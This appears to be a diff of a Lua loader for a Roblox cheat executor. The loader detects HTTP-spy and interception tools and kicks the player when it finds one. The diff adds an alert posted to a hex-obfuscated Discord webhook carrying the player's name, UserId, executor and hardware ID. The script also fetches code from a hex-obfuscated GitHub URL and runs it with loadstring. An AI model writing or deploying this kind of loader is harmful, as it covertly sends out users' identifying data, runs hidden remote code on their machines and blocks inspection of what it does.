@@ -1,9 +1,9 @@
--- Защита от двойного запуска
-if getgenv().__NK_LOADER_RUN then
-    game:GetService("Players").LocalPlayer:Kick("Loader already executed.")
+if getgenv().__NK_LOADER_RUN and (tick() - (getgenv().__NK_LOADER_TIME or 0)) < 30 then
+    game:GetService("Players").LocalPlayer:Kick("Loader already executed. Wait 30 seconds.")
     return
 end
 getgenv().__NK_LOADER_RUN = true
+getgenv().__NK_LOADER_TIME = tick()
 
 local function _0xH(h)
     local s = ""
@@ -14,36 +14,27 @@ end
 local _L = game:GetService("Players").LocalPlayer
 local _H = game:GetService("HttpService")
 local _CG = game:GetService("CoreGui")
+local _RAS = game:GetService("RbxAnalyticsService")
 
--- ДЕТЕКТ СПАЯ - ВЫЗЫВАЕТСЯ ПЕРВЫМ ДЕЛОМ, БЕЗ ЕДИНОГО HTTP-ЗАПРОСА
+-- НАДЁЖНЫЙ ДЕТЕКТ (только проверенные методы, без false positives)
 local function _detectOnce()
     local realHookFunction = hookfunction and clonefunction and clonefunction(hookfunction)
     local realHookMetamethod = hookmetamethod and clonefunction and clonefunction(hookmetamethod)
 
+    -- 1. __namecall: проверяем только через islclosure (надёжно)
     if realHookMetamethod then
         local dummyNc = newcclosure(function(self, ...) return nil end)
         local prevNc
         local ok = pcall(function() prevNc = realHookMetamethod(game, "__namecall", dummyNc) end)
-        if prevNc then
-            pcall(function() realHookMetamethod(game, "__namecall", prevNc) end)
-        end
+        if prevNc then pcall(function() realHookMetamethod(game, "__namecall", prevNc) end) end
         if ok and prevNc then
             local isL = false
             pcall(function() isL = islclosure(prevNc) end)
             if isL then return "SPY_NAMECALL_LCLOSURE" end
-            if getupvalues then
-                local ups
-                pcall(function() ups = getupvalues(prevNc) end)
-                if ups and #ups > 0 then return "SPY_NAMECALL_HAS_UPVALUES" end
-            end
-            if debug and debug.info then
-                local nups
-                pcall(function() nups = debug.info(prevNc, "u") end)
-                if nups and nups > 0 then return "SPY_NAMECALL_DEBUG_UPVALUES" end
-            end
         end
     end
 
+    -- 2. Проверка HTTP-функций: только islclosure
     local function checkHooked(fn)
         if not fn or not realHookFunction then return false end
         local dummy = newcclosure(function() end)
@@ -53,50 +44,46 @@ local function _detectOnce()
         if not ok or not prev then return false end
         local isL = false
         pcall(function() isL = islclosure(prev) end)
-        if isL then return "LCLOSURE" end
-        if getupvalues then
-            local ups
-            pcall(function() ups = getupvalues(prev) end)
-            if ups and #ups > 0 then return "HAS_UPVALUES" end
-        end
-        if debug and debug.info then
-            local nups
-            pcall(function() nups = debug.info(prev, "u") end)
-            if nups and nups > 0 then return "DEBUG_UPVALUES" end
-        end
-        return false
+        return isL
     end
 
-    local r
-    r = checkHooked(game.HttpGet); if r then return "SPY_HTTPGET_" .. r end
-    r = checkHooked(game.HttpGetAsync); if r then return "SPY_HTTPGETASYNC_" .. r end
-    r = checkHooked(game.HttpPost); if r then return "SPY_HTTPPOST_" .. r end
-    r = checkHooked(game.HttpPostAsync); if r then return "SPY_HTTPPOSTASYNC_" .. r end
-    r = checkHooked(_H.RequestAsync); if r then return "SPY_REQUESTASYNC_" .. r end
-    r = checkHooked(_H.GetAsync); if r then return "SPY_GETASYNC_" .. r end
-    r = checkHooked(_H.PostAsync); if r then return "SPY_POSTASYNC_" .. r end
-    if request then r = checkHooked(request); if r then return "SPY_REQUEST_" .. r end end
-    if http_request then r = checkHooked(http_request); if r then return "SPY_HTTP_REQUEST_" .. r end end
-    if http and http.request then r = checkHooked(http.request); if r then return "SPY_HTTP_DOT_REQUEST_" .. r end end
-    if syn and syn.request then r = checkHooked(syn.request); if r then return "SPY_SYN_REQUEST_" .. r end end
+    if checkHooked(game.HttpGet) then return "SPY_HTTPGET_LCLOSURE" end
+    if checkHooked(game.HttpGetAsync) then return "SPY_HTTPGETASYNC_LCLOSURE" end
+    if checkHooked(game.HttpPost) then return "SPY_HTTPPOST_LCLOSURE" end
+    if checkHooked(game.HttpPostAsync) then return "SPY_HTTPPOSTASYNC_LCLOSURE" end
+    if checkHooked(_H.RequestAsync) then return "SPY_REQUESTASYNC_LCLOSURE" end
+    if checkHooked(_H.GetAsync) then return "SPY_GETASYNC_LCLOSURE" end
+    if checkHooked(_H.PostAsync) then return "SPY_POSTASYNC_LCLOSURE" end
 
+    -- 3. GC-скан на СПЕЦИФИЧНЫЕ структуры спаев (высокая точность)
     if getgc then
         local found
         pcall(function()
             for _, v in pairs(getgc(true)) do
                 if type(v) == "table" then
                     pcall(function()
-                        if rawget(v, "blockWebhooks") ~= nil and rawget(v, "blockAll") ~= nil and rawget(v, "paused") ~= nil then
+                        -- HttpSpy koboldpaws _cfg
+                        if rawget(v, "blockWebhooks") ~= nil 
+                        and rawget(v, "blockAll") ~= nil 
+                        and rawget(v, "paused") ~= nil then
                             found = "GC_HTTPSPY_CONFIG"
-                        elseif rawget(v, "GET") and rawget(v, "POST") and rawget(v, "PATCH") and rawget(v, "DELETE") then
+                        -- HttpSpy _methodColors
+                        elseif rawget(v, "GET") and rawget(v, "POST") 
+                        and rawget(v, "PATCH") and rawget(v, "DELETE") 
+                        and rawget(v, "HEAD") then
                             found = "GC_METHOD_COLORS"
-                        elseif rawget(v, "lblue") and rawget(v, "lgreen") and rawget(v, "orange") and rawget(v, "magenta") then
+                        -- HttpSpy _ansi
+                        elseif rawget(v, "lblue") and rawget(v, "lgreen") 
+                        and rawget(v, "orange") and rawget(v, "magenta")
+                        and rawget(v, "reset") then
                             found = "GC_ANSI_COLORS"
-                        elseif rawget(v, "_hooks") and type(rawget(v, "_hooks")) == "table" then
-                            found = "GC_HOOKS_TABLE"
-                        elseif rawget(v, "_con") and rawget(v, "_hooks") and rawget(v, "_cfg") then
+                        -- HttpSpy главный объект
+                        elseif rawget(v, "_con") and rawget(v, "_hooks") 
+                        and rawget(v, "_cfg") and rawget(v, "_status") then
                             found = "GC_HTTPSPY_CLASS"
-                        elseif rawget(v, "_ansi") and rawget(v, "_methodColors") and rawget(v, "_p") then
+                        -- Console class
+                        elseif rawget(v, "_ansi") and rawget(v, "_methodColors") 
+                        and rawget(v, "_p") then
                             found = "GC_CONSOLE_CLASS"
                         end
                     end)
@@ -107,17 +94,17 @@ local function _detectOnce()
         if found then return found end
     end
 
+    -- 4. GC-скан строк — характерные подписи спаев
     if getgc then
         local found
         pcall(function()
             for _, v in pairs(getgc(false)) do
-                if type(v) == "string" and #v < 300 then
+                if type(v) == "string" and #v > 5 and #v < 200 then
                     local lv = string.lower(v)
-                    if string.find(lv, "http spy", 1, true) 
-                    or string.find(lv, "koboldpaws", 1, true)
-                    or string.find(lv, "httpspy", 1, true)
-                    or string.find(lv, "notdsf", 1, true)
-                    or string.find(lv, "bebomods", 1, true) then
+                    if string.find(lv, "koboldpaws", 1, true)
+                    or string.find(lv, "http spy by", 1, true)
+                    or string.find(lv, "bebomods", 1, true)
+                    or string.find(lv, "notdsf", 1, true) then
                         found = "GC_STRING_SPY"
                         return
                     end
@@ -127,14 +114,15 @@ local function _detectOnce()
         if found then return found end
     end
 
-    local badNames = {"HttpSpy", "SimpleSpy", "HydroSpy", "SecureSpy", "TwiSpy", "BeboSpy", "NotDSF", "koboldpaws"}
+    -- 5. GUI-скан (только по конкретным именам, не по частичным)
+    local badExact = {"HttpSpy", "SimpleSpy", "HydroSpy", "SecureSpy", "TwiSpy", "BeboSpy"}
     local function scanGui(root)
         for _, obj in ipairs(root:GetDescendants()) do
             local n
             pcall(function() n = obj.Name end)
             if n then
-                for _, bad in ipairs(badNames) do
-                    if string.find(string.lower(n), string.lower(bad), 1, true) then
+                for _, bad in ipairs(badExact) do
+                    if n == bad or string.find(n, bad, 1, true) then
                         return "SPY_GUI_" .. bad
                     end
                 end
@@ -143,10 +131,10 @@ local function _detectOnce()
                 local t
                 pcall(function() t = obj.Text end)
                 if t then
-                    for _, bad in ipairs(badNames) do
-                        if string.find(string.lower(t), string.lower(bad), 1, true) then
-                            return "SPY_TEXT_" .. bad
-                        end
+                    local lt = string.lower(t)
+                    if string.find(lt, "http spy", 1, true) 
+                    or string.find(lt, "koboldpaws", 1, true) then
+                        return "SPY_TEXT_DETECTED"
                     end
                 end
             end
@@ -156,74 +144,77 @@ local function _detectOnce()
     local found = scanGui(_CG)
     if found then return found end
     local pg = _L:FindFirstChildOfClass("PlayerGui")
-    if pg then
-        found = scanGui(pg)
-        if found then return found end
-    end
+    if pg then found = scanGui(pg); if found then return found end end
 
     return false
 end
 
--- === ГЛАВНОЕ: ПРОВЕРКА ПЕРЕД ЛЮБЫМ HTTP ===
-local _se = _detectOnce()
+-- Отправка алерта о детекте
+local function _sendDetectionAlert(reason)
+    task.spawn(function()
+        pcall(function()
+            local req = (syn and syn.request) or (http and http.request) or http_request or request
+            if not req then return end
+            local alertHook = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
+            local hw = "N/A"
+            pcall(function() hw = _RAS:GetClientId() end)
+            local exec = "Unknown"
+            pcall(function() if identifyexecutor then exec = identifyexecutor() end end)
+            req({
+                Url = alertHook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = _H:JSONEncode({
+                    embeds = {{
+                        title = "🚨 HTTP SPY DETECTED 🚨",
+                        color = 16711680,
+                        description = "**Interceptor was found on user's client.**\nUser has been kicked immediately.",
+                        fields = {
+                            {name = "Detection Type", value = "`" .. tostring(reason) .. "`", inline = false},
+                            {name = "Player", value = string.format("`%s` (`@%s`)\nUserID: `%s`", _L.DisplayName, _L.Name, tostring(_L.UserId)), inline = false},
+                            {name = "Executor", value = "`" .. exec .. "`", inline = true},
+                            {name = "HWID", value = "```" .. hw .. "```", inline = false},
+                            {name = "Profile", value = string.format("https://www.roblox.com/users/%s/profile", tostring(_L.UserId)), inline = false},
+                            {name = "Timestamp", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
+                        },
+                        footer = {text = "Anti-Spy System | Loader Alert"}
+                    }}
+                })
+            })
+        end)
+    end)
+end
 
-if _se then
-    -- НИ ОДНОГО HTTP-ЗАПРОСА! Просто мгновенный кик.
-    -- Вебхук слать нельзя — спай перехватит URL и токен вебхука.
-    -- Максимум что можем — упомянуть детект без раскрытия чего-либо.
-    
-    pcall(function() _L:Kick("Security Error: Interceptor Detected [" .. tostring(_se) .. "]") end)
-    
-    -- Блокируем всё дальнейшее выполнение
+-- Функция кика с алертом
+local function _KICK(reason)
+    _sendDetectionAlert(reason)
+    task.wait(0.3)
+    pcall(function() _L:Kick("Security Error: [" .. tostring(reason) .. "]") end)
     while true do
         task.wait(0.1)
-        pcall(function() _L:Kick("Security Error: Interceptor Detected [" .. tostring(_se) .. "]") end)
+        pcall(function() _L:Kick("Security Error: [" .. tostring(reason) .. "]") end)
     end
 end
 
--- Двойная проверка после короткой паузы (ловит lazy-хуки)
+-- === ПЕРВАЯ ПРОВЕРКА ===
+local _se = _detectOnce()
+if _se then _KICK(_se) end
+
+-- ВТОРАЯ ПРОВЕРКА через 0.3с
 task.wait(0.3)
 local _se2 = _detectOnce()
-if _se2 then
-    pcall(function() _L:Kick("Security Error: [" .. tostring(_se2) .. "]") end)
-    while true do
-        task.wait(0.1)
-        pcall(function() _L:Kick("Security Error: [" .. tostring(_se2) .. "]") end)
-    end
-end
+if _se2 then _KICK(_se2) end
 
--- Только теперь можно использовать HTTP: получаем request
-local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-
--- Ключ для логгера
-local _tk = "N/A"
-pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then
-            _tk = readfile("nazarkus_key.json")
-        else
-            _tk = _H:GenerateGUID(false)
-            writefile("nazarkus_key.json", _tk)
-        end
-    end
-end)
-
--- Фоновая пере-проверка на случай lazy-хуков (проверяем каждые 2 сек первые 10 сек)
+-- ПОСТОЯННАЯ ФОНОВАЯ ПРОВЕРКА (каждую секунду, всегда)
 task.spawn(function()
-    for i = 1, 5 do
-        task.wait(2)
-        local se3 = _detectOnce()
-        if se3 then
-            pcall(function() _L:Kick("Security Error: Late detection [" .. tostring(se3) .. "]") end)
-            while true do
-                task.wait(0.1)
-                pcall(function() _L:Kick("Security Error: [" .. tostring(se3) .. "]") end)
-            end
-        end
+    while true do
+        task.wait(1)
+        local se = _detectOnce()
+        if se then _KICK(se) end
     end
 end)
 
--- === АВТОРИЗАЦИЯ И ЗАГРУЗКА ===
+-- === АВТОРИЗАЦИЯ ===
 local _TS = game:GetService("TestService")
 local _ST = _TS:FindFirstChild("__NK_RUNTIME")
 if not _ST then
@@ -237,12 +228,18 @@ _AU.Value = "V8_SECURE_AUTH"
 _AU.Parent = _ST
 shared._NK_AUTH = "V8_SECURE_AUTH"
 
+-- Экспорт для rpg.lua
+getgenv().__NK_detectSpy = _detectOnce
+getgenv().__NK_sendAlert = _sendDetectionAlert
+getgenv().__NK_KICK = _KICK
+
 local _G_URL = _0xH("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F7270672E6C7561")
+
+local _req = (syn and syn.request) or (http and http.request) or http_request or request
 
 local res = nil
 local ok1, r1 = pcall(function() return game:HttpGet(_G_URL) end)
 if ok1 and r1 and #r1 > 0 then res = r1 end
-
 if not res and _req then
     local ok2, r2 = pcall(_req, {Url = _G_URL, Method = "GET"})
     if ok2 and r2 and r2.Body and #r2.Body > 0 then res = r2.Body end
@@ -250,11 +247,7 @@ end
 
 if res and #res > 0 then
     local f, err = loadstring(res)
-    if f then
-        task.spawn(f)
-    else
-        _L:Kick("Error 0x83: " .. tostring(err))
-    end
+    if f then task.spawn(f) else _L:Kick("Error 0x83: " .. tostring(err)) end
 else
     _L:Kick("Error 0x82")
 end
